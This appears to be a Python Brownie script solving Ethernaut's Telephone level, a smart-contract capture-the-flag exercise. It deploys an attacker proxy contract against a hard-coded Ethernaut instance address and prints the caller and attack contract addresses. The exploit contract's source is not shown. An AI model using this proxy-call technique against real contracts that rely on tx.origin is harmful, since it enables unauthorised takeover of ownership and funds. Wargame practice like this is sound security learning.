from scripts.helpful_scripts import get_account
from brownie import accounts, web3, config, interface, Attack04

ETHERNAUT_INSTANCE = "0xaA0349CfC5a3cE9FD3f24622F749799693b64354"


def main():
    # Ethernaut Instance
    contract = ETHERNAUT_INSTANCE
    player = get_account()

    # Deploy the attacker (proxy) contract: to call the Telephone contract
    attack = Attack04.deploy(contract, {"from": player})

    print(f"msg.sender = {player.address}\nattack address = {attack.address}")
